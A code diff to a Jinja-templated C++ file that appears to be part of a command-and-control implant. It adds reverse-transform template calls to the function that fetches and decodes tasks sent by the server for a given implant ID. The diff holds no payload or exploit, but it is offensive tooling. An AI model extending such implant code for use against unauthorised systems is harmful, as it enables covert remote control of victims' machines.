@@ -25,9 +25,13 @@ Required Keys:
 #include "../data/transforms/transforms.h"
 #include "../data/msgpack/msgpack.h"
 
-[% from 'transform_output.jinja' import render_transform_output -%]
-[% from 'transform_metadata.jinja' import render_transform_metadata -%]
-[% from 'transform_id.jinja' import render_transform_id -%]
+[% from 'transform_output.j2' import render_transform_output -%]
+[% from 'transform_metadata.j2' import render_transform_metadata -%]
+[% from 'transform_id.j2' import render_transform_id -%]
+
+[% from 'transform_reverse_output.j2' import render_reverse_transform_output -%]
+[% from 'transform_reverse_metadata.j2' import render_reverse_transform_metadata -%]
+[% from 'transform_reverse_id.j2' import render_reverse_transform_id -%]
 
 nlohmann::json get(std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
@@ -61,7 +65,20 @@ nlohmann::json get(std::string implant_uuid) {
             return nullptr;
         }
 
-        // TODO: transform from raw data too...
+        //string of response var here
+        //TODO: Extract task from whatever field is specified
+        /*
+        jinja if that field...
+        else
+        */
+
+        // TODO: transform from raw data - NOTE! Use reverse funcs, as this is data coming back from server
+        // --- Reverse Transforms ---
+        [%- for transform in http_get_server_output_transforms_list %]
+        [[ render_reverse_transform_output(transform) ]]
+        [%- endfor %]
+        // --- End Reverse Transforms ---
+
         std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
         nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
         return task_data;
